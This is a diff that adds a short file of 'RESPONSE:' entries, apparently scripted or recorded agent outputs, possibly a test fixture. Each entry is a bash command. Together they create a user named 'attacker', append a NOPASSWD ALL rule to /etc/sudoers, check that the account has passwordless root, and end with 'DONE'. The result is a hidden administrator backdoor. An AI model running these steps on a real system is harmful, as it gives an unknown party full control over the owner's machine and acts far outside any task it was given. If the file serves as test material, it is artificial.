@@ -1,0 +1,18 @@
+RESPONSE: ```bash
+echo password | sudo -S useradd -m attacker
+```
+RESPONSE: ```bash
+echo password | sudo -S sh -c 'echo "attacker ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers'
+```
+RESPONSE: ```bash
+grep attacker /etc/sudoers && id attacker
+```
+RESPONSE: ```bash
+echo password | sudo -S -u attacker whoami
+```
+RESPONSE: ```bash
+echo password | sudo -S -u attacker sudo -n true
+```
+RESPONSE: ```bash
+DONE
+```
